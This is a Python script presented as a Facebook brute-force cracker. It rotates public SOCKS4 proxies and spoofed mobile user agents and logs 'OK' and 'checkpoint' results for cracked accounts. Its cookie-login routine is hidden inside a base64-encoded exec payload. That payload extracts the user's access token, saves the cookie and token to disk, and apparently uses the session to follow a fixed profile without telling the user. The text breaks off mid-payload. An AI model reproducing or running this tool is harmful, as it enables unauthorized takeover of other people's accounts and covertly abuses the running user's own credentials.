#! usr/bin/python3

# <------[ Import Module ]------->
import requests, bs4, json, os, sys, random, datetime, time, re, rich, calendar, sys, subprocess, logging, uuid, base64
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import strftime
from time import sleep
from rich import print as coy
from rich.panel import Panel as nel 
from rich.tree import Tree
from rich.columns import Columns
from rich.console import Console as Wagyo
console = Wagyo()

try:
  prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
  open('.prox.txt','w').write(prox)
except Exception as e:
  print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mERROR NOT FOUND 404 | No Internet !')
prox=open('.prox.txt','r').read().splitlines()

# <-------[ Global Name]------->
id, id2 =  [], []
ualu, ualuh = [], []
pwpluss, pwnya = [], []
tokenku, method = [], []
loop, ok, cp = 0, 0, 0
ses = requests.Session()
sys.stdout.write('\x1b]2; FaceBF | Facebook Brute Force By FaisalGtG\x07')

# <-------[ Color ]------->
rc = random.choice
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
N = '\x1b[0m'    
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
warna = rc([
  A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M
  ])

# <-------[ Color 2 ]------->
M2, H2, K2, P2, B2, U2, O2, C2, J2 = ["[#FF0000]", "[#00FF00]", "[#FFFF00]", "[#FFFFFF]", "[#1e00ff]", "[#b900ff]", "[#EB6000]", "[#00fbff]", "[#ff14cf]"]
acak = [M2, H2, K2, B2, U2, O2, P2, C2, J2]
warna2 = random.choice(acak)
til =f"{M2}● {K2}● {H2}●"
ken = f'{M2}›{K2}›{H2}› '
tod = f' {H2}‹{K2}‹{M2}‹'

# <-------[ Time ]------->
bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")
rok = f'{H2}OK{P2}-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
rcp = f'{K2}CP{P2}-'+str(tgl)+'-'+str(bln)+'-' +str(thn)+'.txt'
okc = f'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = f'CP-'+str(tgl)+'-'+str(bln)+'-' +str(thn)+'.txt'

# <-------[ Get IP - Country ]------->
ipaddr = requests.get("http://ip-api.com/json/").json()["query"]
negara = requests.get("http://ip-api.com/json/").json()["country"]

#<-[ Convert-Cookies ]->#
#def Konversi(cookie):
#	cok = ('datr=%s;fr=%s;c_user=%s;xs=%s'%(cookie['datr'],cookie['fr'],cookie['c_user'],cookie['xs']))
#	return(str(cok))
#------------[ UBAH UA DIH SINI OM ]---------------#
def Ugen():
	a = random.choice(["7","8","9","10","12","13","14","6.0","7.0","8.0","9.0","7.1.1","8.0.0","8.1.0",f"{str(random.randint(5,9))}.0.0",f"{str(random.randint(5,9))}.0.1",f"{str(random.randint(5,9))}.1.1",f"{str(random.randint(5,9))}.1.{str(random.randint(0,1))}",f"{str(random.randint(5,9))}.0",str(random.randint(5,14))])
	b = random.choice(["LRX22C","LRX21V","LRX22G","LMY47I","LMY47V","OPM1","OPR1","O11019","TPR1","TP1A","RP1A","PPR1","PKQ1","QQ1A","QP1A","SKQ1","SP1A","RKQ1","RQ1A","QKQ1","TKQ1"])
	c = random.randrange(130000,230000)
	d = random.randrange(10,32)
	e = random.randrange(80,120)
	f = '0'
	g = random.randrange(4200,6200)
	h = random.randrange(70,200)
	i = random.choice(['MZ-m1 note','MZ-m2 note','MZ-M3s','MZ-M3','MZ-M5s','MZ-M3 Max','MZ-m3 note','MZ-MX4','MZ-U20','MZ-MX4 Pro','MZ-PRO 5','MZ-U10','MZ-M5c','MZ-meizu M8 lite','MZ-mmm52','MZ-Meizu S6','MZ-M3 Max','MZ-M1 E','MZ-meizu note9','MZ-16 X','MZ-16th Plus','MZ-15 Plus','MZ-16T','MZ-M6','MZ-PRO 7 Plus','MZ-m1 metal','MZ-16s Pro','MZ-M5 Note','MZ-Meizu 6T','MZ-16 X','MZ-16th','MZ-MEIZU 18X','MZ-MEIZU 18s','MZ-M1822','MZ-meizu 17','MZ-meizu 17 Pro','MZ-MEIZU 18 Pro','MZ-TYH212U','MZ-MEIZU 20','MZ-MEIZU 20 Pro','Meizu C3','MZ-ZTE T660','ZTE BLADE 8'])
	j = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','RMX3516','RMX3371','RMX3461','RMX3286','RMX3561','RMX3388','RMX3311','RMX3142','RMX2071','RMX1805','RMX1809','RMX1801','RMX1807','RMX1803','RMX1825','RMX1821','RMX1822','RMX1833','RMX1851','RMX1853','RMX1827','RMX1911','RMX1919','RMX1927','RMX1971','RMX1973','RMX2030','RMX2032','RMX1925','RMX1929','RMX2001','RMX2061','RMX2063','RMX2040','RMX2042','RMX2002','RMX2151','RMX2163','RMX2155','RMX2170','RMX2103','RMX3085','RMX3241','RMX3081','RMX3151','RMX3381','RMX3521','RMX3474','RMX3471','RMX3472','RMX3392','RMX3393','RMX3491','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1941','RMX1945','RMX3063','RMX3061','RMX3201','RMX3203','RMX3261','RMX3263','RMX3193','RMX3191','RMX3195','RMX3197','RMX3265','RMX3268','RMX3269','RMX2027','RMX2020','RMX2021','RMX3581','RMX3501','RMX3503','RMX3511','RMX3310','RMX3312','RMX3551','RMX3301','RMX3300','RMX2202','RMX3363','RMX3360','RMX3366','RMX3361','RMX3031','RMX3370','RMX3357','RMX3560','RMX3562','RMX3350','RMX2193','RMX2161','RMX2050','RMX2156','RMX3242','RMX3171','RMX3430','RMX3235','RMX3506','RMX2117','RMX2173','RMX3161','RMX2205','RMX3462','RMX3478','RMX3372','RMX3574','RMX1831','RMX3121','RMX3122','RMX3125','RMX3043','RMX3042','RMX3041','RMX3092','RMX3093','RMX3571','RMX3475','RMX2200','RMX2201','RMX2111','RMX2112','RMX1901','RMX1903','RMX1992','RMX1993','RMX1991','RMX1931','RMX2142','RMX2081','RMX2085','RMX2083','RMX2086','RMX2144','RMX2051','RMX2025','RMX2075','RMX2076','RMX2072','RMX2052','RMX2176','RMX2121','RMX3115','RMX1921'])
	k = random.choice(['CPH1869','CPH1929','CPH2107','CPH2238','CPH2389','CPH2401','CPH2407','CPH2413','CPH2415','CPH2417','CPH2419','CPH2455','CPH2459','CPH2461','CPH2471','CPH2473','CPH2477','CPH8893','CPH2321','CPH2341','CPH2373','CPH2083','CPH2071','CPH2077','CPH2185','CPH2179','CPH2269','CPH2421','CPH2349','CPH2271','CPH1923','CPH1925','CPH1837','CPH2015','CPH2073','CPH2081','CPH2029','CPH2031','CPH2137','CPH1605','CPH1803','CPH1853','CPH1805','CPH1809','CPH1851','CPH1931','CPH1959','CPH1933','CPH1935','CPH1943','CPH2061','CPH2069','CPH2127','CPH2131','CPH2139','CPH2135','CPH2239','CPH2195','CPH2273','CPH2325','CPH2309','CPH1701','CPH2387','CPH1909','CPH1920','CPH1912','CPH1901','CPH1903','CPH1905','CPH1717','CPH1801','CPH2067','CPH2099','CPH2161','CPH2219','CPH2197','CPH2263','CPH2375','CPH2339','CPH1715','CPH2385','CPH1729','CPH1827','CPH1938','CPH1937','CPH1939','CPH1941','CPH2001','CPH2021','CPH2059','CPH2121','CPH2123','CPH2203','CPH2333','CPH2365','CPH1913','CPH1911','CPH1915','CPH1969','CPH2209','CPH1987','CPH2095','CPH2119','CPH2285','CPH2213','CPH2223','CPH2363','CPH1609','CPH1613','CPH1723','CPH1727','CPH1725','CPH1819','CPH1821','CPH1825','CPH1881','CPH1823','CPH1871','CPH1875','CPH2023','CPH2005','CPH2025','CPH2207','CPH2173','CPH2307','CPH2305','CPH2337','CPH1955','CPH1707','CPH1719','CPH1721','CPH1835','CPH1831','CPH1833','CPH1879','CPH1893','CPH1877','CPH1607','CPH1611','CPH1917','CPH1919','CPH1907','CPH1989','CPH1945','CPH1951','CPH2043','CPH2035','CPH2037','CPH2036','CPH2009','CPH2013','CPH2113','CPH2091','CPH2125','CPH2109','CPH2089','CPH2065','CPH2159','CPH2145','CPH2205','CPH2201','CPH2199','CPH2217','CPH1921','CPH2211','CPH2235','CPH2251','CPH2249','CPH2247','CPH2237','CPH2371','CPH2293','CPH2353','CPH2343','CPH2359','CPH2357','CPH2457','CPH1983','CPH1979','oppo f 5 plus','OPPO F1','OPPO F1 Plus','PEPM00','PEDM00','PCHM10','PCLM10','PCCM00','PDBM00','OPPO PBBM30','OPPO A31','OPPO F1s','A31','OPPO R11s','OPPO A37m'])
	l = random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X676B','Infinix X687','Infinix X609','Infinix X697','Infinix X680D','Infinix X507','Infinix X605','Infinix X668','Infinix X6815B','Infinix X624','Infinix X655F','Infinix X689C','Infinix X608','Infinix X698','Infinix X682C','Infinix X688C','Infinix X689B','Infinix X689','Infinix X689D','Infinix X662','Infinix X662B','Infinix X675','Infinix X6812B','Infinix X6812','Infinix X6817B','Infinix X6817','Infinix X6816C','Infinix X6816','Infinix X6816D','Infinix X668C','Infinix X665B','Infinix X665E','Infinix X510','Infinix X559C','Infinix X559F','Infinix X559','Infinix X606','Infinix X606C','Infinix X606D','Infinix X623','Infinix X624B','Infinix X625C','Infinix X625D','Infinix X625B','Infinix X650D','Infinix X650B','Infinix X650','Infinix X650C','Infinix X655C','Infinix X655D','Infinix X680B','Infinix X573','Infinix X573B','Infinix X622','Infinix X693','Infinix X695C','Infinix X695D','Infinix X695','Infinix X663B','Infinix X663','Infinix X670','Infinix X671','Infinix X671B','Infinix X672','Infinix X6819','Infinix X572','Infinix X572-LTE','Infinix X571','Infinix X604','Infinix X610B','Infinix X690','Infinix X690B','Infinix X656','Infinix X692','Infinix X683','Infinix X450','Infinix X5010','Infinix X501','Infinix X401','Infinix X626','Infinix X626B','Infinix X652','Infinix X652A','Infinix X652B','Infinix X652C','Infinix X660B','Infinix X660C','Infinix X660','Infinix X5515','Infinix X5515F','Infinix X5515I','Infinix X609B','Infinix X5514D','Infinix X5516B','Infinix X5516C','Infinix X627','Infinix X680','Infinix X653','Infinix X653C','Infinix X657','Infinix X657B','Infinix X657C','Infinix X6511B','Infinix X6511E','Infinix X6511','Infinix X6512','Infinix X6823C','Infinix X612B','Infinix X612','Infinix X503','Infinix X511','Infinix X352','Infinix X351','Infinix X530','Infinix X676C','Infinix X6821','Infinix X6823','Infinix X6827','Infinix X509','Infinix X603','Infinix X6815','Infinix X620B','Infinix X620','Infinix X687B','Infinix X6811B','Infinix X6810','Infinix X6811',f"Infinix X{str(random.randint(550,699))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(5511,5516))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(6711,6899))}{random.choice(['B','C','D','E','F',''])}"])
	m = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750','GT-I9300','TECNO CD8','itel L6005','itel L6501','TECNO KE7','TECNO IN2','TECNO CD6j','TECNO BD2p','TECNO KD7h','TECNO LA7','itel W6004','MobiGo2','TECNO LC6','TECNO KB7j','itel S661W','TB300FU','S96GT','ZTE A2023G','OPPO A79kt','TECNO CI7n','MP1718','V2154A','SAMSUNG SM-M346B','itel S663L','CHL-AL00','vivo Z3x','CHL-AL00','ivvi P60(i8)'])
	n = random.choice([f'{str(random.randint(10,18))}_{str(random.randint(0,9))}_{str(random.randint(0,9))}',f'{str(random.randint(10,18))}_{str(random.randint(0,9))}'])
	o = random.choice(['SAMSUNG SM-J210Y','SAMSUNG SM-E203Y','SAMSUNG SM-T87V','SAMSUNG SM-D738P','SAMSUNG SM-W748D','SAMSUNG SM-Z794M','SAMSUNG SM-K144T','SAMSUNG SM-L372N','SAMSUNG SM-B588T','SAMSUNG SM-R584V','SAMSUNG SM-R108Z;]'])
	p = (['2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC'])
	z = random.choice([
		f"Mozilla/5.0 (Linux; Android 11; CPH1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
  f"Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.105 Mobile Safari/537.36]",
  f"Mozilla/5.0 (Linux; Android 11; CPH2089) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4664.104 Mobile Safari/537.36", 
  f"Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36",
  f"Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36",
  f"Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36",
  f"Mozilla/5.0 (Linux; Android 14; SM-A135F Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.105 Mobile Safari/537.36",
  f"Mozilla/5.0 (Linux; Android 14; SM-A536B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.105 Mobile Safari/537.36",
  f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.54 Mobile Safari/537.36"
  f"Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.105 Mobile Safari/537.36"
	])
	return z
	
def Ugen2():
	a = 'Mozilla/5.0 (Linux; U; Android'
	b = random.choice(['7.0','8.1.0','4','5','6','7','8','9','10','11','12'])
	c = 'SM-J710MN)'
	d = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e = random.randrange(1, 999)
	f = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h = random.randrange(73, 100)
	i = '0'
	j = random.randrange(4200, 4900)
	k = random.randrange(40, 150)
	l = 'Mobile Safari/537.36'
	m = f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	return m

# <-------[ Back Menu ]------->
def KembaliKeLaptop():
  Menu()

# <-------[ Clear Layer ]------->
def ClearLayer():
  os.system("cls" if os.name == "nt" else "clear")
  
# <-------[ Animation ]------->
def _Animation_(u):
  for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

# <-------[ Remove Cookies ]------->
def Kaluar():
  os.system('rm -rf .token.txt')
  os.system('rm -rf cookie.txt')
  _Animation_(f'{warna}[•] {P}Berhasil Menghapus \x1b[1;9m\x1b[1;91mCookie ')
  exit()
  
# <-------[ Logo Login ]------->
def banlog():
  coy(nel(f'''  {til}
  
         {P2}░{C2}█───{P2}  ░{C2}█▀▀▀█{P2}  ░{C2}█▀▀█{P2}  {C2}▀█▀{P2}  ░{C2}█▄─{P2}░{C2}█{P2}
         ░{C2}█─── {P2} ░{C2}█──{P2}░{C2}█ {P2} ░{C2}█─▄▄ {P2} ░{C2}█─  {P2}░{C2}█{P2}░{C2}█{P2}░{C2}█{P2}     
         ░{C2}█▄▄█ {P2} ░{C2}█▄▄▄█ {P2} ░{C2}█▄▄█{P2}  {C2}▄█▄  {P2}░{C2}█──▀█{P2}
         Login With Facebook Cookies !!
         ''',title=f'{ken}{P2}Login Diperlukan{tod}',width=55,padding=(0),style='#ff14cf'))

# <-------[ Logo Menu ]------->
def logomenu():
  nanel = nel(f'{P2}Your IP: {H2}{ipaddr}\n{P2}Country: {H2}{negara}',width=28,style='#ffffff')
  nalel = nel(f'{P2}Day  : {H2}{hari}\n{P2}Date : {H2}{tanggal}',width=27,style='#ffffff')
  columns = Columns([nanel,nalel])
  logo = coy(nel(f'''[bold red]  ●[bold yellow] ●[bold green] ●                                     {P2}Version {H2}1.5
[bold red]########    ###    ####  ######     ###    ##       
[bold red]##         ## ##    ##  ##    ##   ## ##   ##       
[bold red]##        ##   ##   ##  ##        ##   ##  ##       
[bold red]######   ##     ##  ##   ######  ##     ## ##       
[bold red]##       #########  ##        ## ######### ##       
[bold red]##       ##     ##  ##  ##    ## ##     ## ##       
[bold red]##       ##     ## ####  ######  ##     ## ########              By Bang Icall
                 
                   [on #80FF00]Coded By FaisalGtG.
''',title=f'{ken}{P2}Banner{tod}',width=60,padding=(0),style='#ff00f5'))
  coy(nel(columns,width=60,title=f'{ken}{P2}Info User{tod}',style='#ff00f5'))

# <-------[ Menu 1 ]------->
def menulogin():
  ClearLayer();banlog()
  tree = Tree(nel(f'   {P2}List Menu {H2}Login {P2}& Check Result {H2}Live{P2}/{K2}Check{P2}',width=55,style='#ff00e2'))
  tree.add(f'{P2}01. Login With Cookie {B2}Facebook')
  tree.add(f'{P2}02. Check Result {H2}Live{P2}/{K2}Checkpoint')
  console.print(tree)
  print('')
  wagyo_ = input(f'{P}[{warna}?{P}] Choice: ')
  if   wagyo_ in ['01','1']:
    LoginCookies()
  elif wagyo_ in ['02','2']:
    Result()

# <-------[ Login ]------->
exec(base64.b64decode(b'ZGVmIExvZ2luQ29va2llcygpOgoJQ2xlYXJMYXllcigpCglvcy5wb3BlbigncGxheS1hdWRpbyBEYXRhL0F1ZGlvL2xvZ2luLm1wMycpO2JhbmxvZygpCgljb3kobmVsKGYne1AyfSAgICAgR3VuYWthbiBBa3VuIFR1bWJhbCBKYW5nYW4gQWt1biBQcmliYWRpLlxuICAgIERhbiBHdW5ha2FuIEFrdW4gWWFuZyBNYXNpaCBGcmVzaCAoIEJhcnUgKS4nLHN1YnRpdGxlPWYne1AyfeKVreKUgCcsc3VidGl0bGVfYWxpZ249J2xlZnQnLHdpZHRoPTU1LHN0eWxlPScjZmYwMGYxJykpCgljb2sgPSBpbnB1dChmJyAgIOKVsOKUgO+AlT4ge0h9JykKCXRyeToKCQloZWFkID0geyJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzcyLjAuMzYyNi4xMjEgU2FmYXJpLzUzNy4zNiJ9CgkJbGluayA9IHNlcy5nZXQoImh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9hZHNtYW5hZ2VyP19yZGM9MSZfcmRyIiwgaGVhZGVycz1oZWFkLCBjb29raWVzPXsiY29va2llIjogY29rfSkKCQlmaW5kID0gcmUuZmluZGFsbCgnYWN0PSguKj8pJm5hdl9zb3VyY2UnLCBsaW5rLnRleHQpCgkJaWYgbGVuKGZpbmQpID09IDA6CgkJICBfQW5pbWF0aW9uXyhmJ1vigKJdIHtQfUNvb2tpZSBJbnZhbGlkLCBQbGVhc2UgVXNlIENvb2tpZSBOZXcgIScpCgkJICB0aW1lLnNsZWVwKDIpCgkJICBMb2dpbkNvb2tpZXMoKQoJCWVsc2U6CgkJCWZvciB4IGluIGZpbmQ6CgkJCQl4eiA9IHNlcy5nZXQoZiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vYWRzbWFuYWdlci9tYW5hZ2UvY2FtcGFpZ25zP2FjdD17eH0mbmF2X3NvdXJjZT1ub19yZWZlcnJlciIsIGhlYWRlcnMgPSBoZWFkLCBjb29raWVzPXsiY29va2llIjogY29rfSkKCQkJCXRvb2sgPSByZS5zZWFyY2goJyhFQUFCXHcrKScseHoudGV4dCkuZ3JvdXAoMSkKCQkJCXRva2VudyA9IG9wZW4oIi50b2tlbi50eHQiLCAidyIpLndyaXRlKHRvb2spCgkJCQljb2tpZXcgPSBvcGVuKCJjb29raWUudHh0IiwgInciKS53cml0ZShjb2spCgkJCQlwYW5lbCA9IG5lbC5maXQoZid7SDJ9TG9naW4gU3VjY2Vzcycsc3R5bGU9JyNmZmZmZmYnKQoJCQkJdHJlZSA9IFRyZWUocGFuZWwpCgkJCQl0cmVlLmFkZChmJ3tIMn17dG9va30nKQoJCQkJdHJlZS5hZGQoZid7UDJ9UnVuIFVsYW5nISBLZXRpayB7SDJ9IHB5dGhvbjMgUnVuLnB5JykKCQkJCWNvbnNvbGUucHJpbnQodHJlZSkKCQkJCWZvbGxvd19ndWUoKTtmb2xsb3dfZ3VldjIoKTtNZW51KCkKCWV4Y2VwdCBFeGNlcHRpb24gYXMgZTpleGl0KGUpCgojIDwtLS0tLS0tWyBGb2xsb3cgR3VlIF0tLS0tLS0tPgpkZWYgZm9sbG93X2d1ZSgpOgoJdHJ5OgoJICBjb2sgPSBvcGVuKCdjb29raWUudHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6X0FuaW1hdGlvbl8oZid7WH0gQ29va2llIEludmFsaWQhJyk7dGltZS5zbGVlcCg1KTtDaGVja0Nvb2tpZSgpCgl0cnk6CgkJZm9yIGZvbGwgaW4gcGFyc2VyKHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8xMTYxMjE3ODQyJyxjb29raWVzPXsnY29va2llJzpjb2t9KS50ZXh0LCdodG1sLnBhcnNlcicpLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOgoJCQlpZiAnL2Evc3Vic2NyaWJlLnBocD8nIGluIGZvbGwuZ2V0KCdocmVmJyk6CgkJCQl4PX